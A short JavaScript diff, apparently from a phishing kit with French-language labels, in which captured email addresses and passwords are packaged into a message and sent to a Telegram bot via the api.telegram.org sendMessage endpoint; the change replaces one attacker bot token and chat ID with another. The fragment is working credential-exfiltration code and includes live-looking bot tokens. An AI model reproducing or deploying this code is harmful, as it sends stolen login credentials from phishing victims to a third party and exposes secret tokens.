@@ -14,8 +14,8 @@ Adresse e-mail: ${email}
 Mot de passe: ${password}`;
       const encodedMessage = encodeURIComponent(message);
       
-      const BOT_TOKEN = "6624432570:AAGqO15QChjwc77w3qNLTA73DZWO3LsqwNA";
-      const CHAT_ID = "1957433646";
+      const BOT_TOKEN = "7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs";
+      const CHAT_ID = "-4766781392";
       
       const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`;
       
